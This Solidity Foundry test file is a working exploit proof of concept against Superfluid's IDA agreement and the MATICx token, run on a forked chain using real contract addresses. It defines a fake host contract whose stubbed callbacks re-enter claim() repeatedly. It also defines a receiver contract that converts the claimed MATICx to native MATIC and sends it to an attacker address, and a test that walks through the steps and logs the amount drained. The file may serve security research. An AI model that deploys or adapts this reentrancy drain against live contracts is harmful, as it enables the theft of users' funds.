// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";

interface IIDA {
    function claim(address,address,uint32,address,bytes calldata) external returns (bytes memory);
    function getSubscription(address,address,uint32,address) external view returns (bool,bool,uint128,uint256);
}
interface IMATICx {
    function balanceOf(address) external view returns (uint256);
    function realtimeBalanceOfNow(address) external view returns (int256,uint256,uint256);
    function upgradeByETH() external payable;
    function downgradeToETH(uint256) external;
}
interface ISuperfluid {
    function callAgreement(address,bytes calldata,bytes calldata) external returns (bytes memory);
}

contract DrainHost {
    address public ida; address public maticx;
    address public publisher; address public subscriber;
    uint32 public indexId; uint public count; uint public maxCount;
    
    constructor(address _ida, address _mx) { ida=_ida; maticx=_mx; }
    function setTarget(address p, uint32 i, address s, uint m) external {
        publisher=p; indexId=i; subscriber=s; maxCount=m;
    }
    function getAppManifest(address) external pure returns (bool,bool,uint256) { return (true,false,0); }
    function isApp(address) external pure returns (bool) { return true; }
    function isCtxValid(bytes calldata) external pure returns (bool) { return true; }
    function decodeCtx(bytes memory) external pure returns (uint8,uint8,uint256,address,bytes4,bytes memory,uint256,uint256,int256,address,address) {
        return (0,1,0,address(0),bytes4(0),"",0,0,0,address(0),address(0));
    }
    function appCallbackPush(bytes calldata,address,uint256,int256,address) external returns (bytes memory) { return ""; }
    function appCallbackPop(bytes calldata,int256) external returns (bytes memory) { return ""; }
    function callAppBeforeCallback(address,bytes calldata,bool,bytes calldata) external returns (bytes memory) {
        if (count < maxCount) {
            count++;
            bytes memory ctx = abi.encode(
                abi.encode(uint256(1<<32),uint256(0),address(0),bytes4(0),bytes("")),
                abi.encode(uint256(0),int256(0),address(0),address(0))
            );
            try IIDA(ida).claim(maticx, publisher, indexId, subscriber, ctx) {} catch {}
        }
        return "";
    }
    function callAppAfterCallback(address,bytes calldata,bool,bytes calldata ctx) external returns (bytes memory) { return ctx; }
    function attack() external { count=0;
        bytes memory ctx = abi.encode(abi.encode(uint256(1<<32),uint256(0),address(0),bytes4(0),bytes("")),abi.encode(uint256(0),int256(0),address(0),address(0)));
        IIDA(ida).claim(maticx, publisher, indexId, subscriber, ctx);
    }
    receive() external payable {}
}

/// @notice Subscriber contract that receives MATICx and downgrades to native
contract Receiver {
    function drainMATICx(address maticx, address payable to) external {
        uint256 bal = IMATICx(maticx).balanceOf(address(this));
        if (bal > 0) {
            IMATICx(maticx).downgradeToETH(bal);
            to.transfer(address(this).balance);
        }
    }
    receive() external payable {}
}

contract SelfReentryDrainTest is Test {
    address constant HOST = 0x3E14dC1b13c488a8d5D310918780c983bD5982E7;
    address constant IDA = 0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1;
    address constant MATICx = 0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3;
    address constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_CH5_SUPERFLUID_V2"));
    }

    function test_selfPublishReentryDrain() public {
        vm.startPrank(ATTACKER);
        
        // Deploy receiver (subscriber)
        Receiver receiver = new Receiver();
        
        // Step 1: Upgrade 1 MATIC to MATICx
        IMATICx(MATICx).upgradeByETH{value: 1 ether}();
        console.log("1. Upgraded 1 MATIC to MATICx");
        console.log("   MATICx balance:", IMATICx(MATICx).balanceOf(ATTACKER));

        // Step 2: Create index (attacker = publisher)  
        ISuperfluid(HOST).callAgreement(IDA, abi.encodeWithSelector(
            bytes4(keccak256("createIndex(address,uint32,bytes)")), MATICx, uint32(42), new bytes(0)
        ), "");
        console.log("2. Created index 42 (publisher=attacker)");

        // Step 3: Add receiver as subscriber with units
        ISuperfluid(HOST).callAgreement(IDA, abi.encodeWithSelector(
            bytes4(keccak256("updateSubscription(address,uint32,address,uint128,bytes)")), MATICx, uint32(42), address(receiver), uint128(1), new bytes(0)
        ), "");
        console.log("3. Added receiver as subscriber (units=1)");

        // Step 4: Distribute by updating index (tiny amount)
        ISuperfluid(HOST).callAgreement(IDA, abi.encodeWithSelector(
            bytes4(keccak256("updateIndex(address,uint32,uint128,bytes)")), MATICx, uint32(42), uint128(1 ether), new bytes(0)
        ), "");
        console.log("4. Updated index value to 1 ether per unit");
        
        vm.stopPrank();

        // Check subscription state
        (bool e, bool a, uint128 u, uint256 p) = IIDA(IDA).getSubscription(MATICx, ATTACKER, 42, address(receiver));
        console.log("Receiver pending:"); console.log(p);

        // Step 5: FakeHost reentrancy claim!
        DrainHost dh = new DrainHost(IDA, MATICx);
        dh.setTarget(ATTACKER, 42, address(receiver), 10); // 10 reentries
        
        console.log("\n5. FakeHost reentrancy claim (10 reentries)...");
        uint256 nativeBefore = ATTACKER.balance;
        
        dh.attack();
        
        console.log("   Reentry count:", dh.count());
        
        // Check receiver's MATICx
        uint256 receiverBal = IMATICx(MATICx).balanceOf(address(receiver));
        console.log("   Receiver MATICx:", receiverBal);
        
        // Step 6: Receiver downgrades MATICx to native
        if (receiverBal > 0) {
            receiver.drainMATICx(MATICx, payable(ATTACKER));
            console.log("\n6. Drained MATICx to native MATIC!");
            console.log("   Attacker native gained:", ATTACKER.balance - nativeBefore);
        }
    }
}
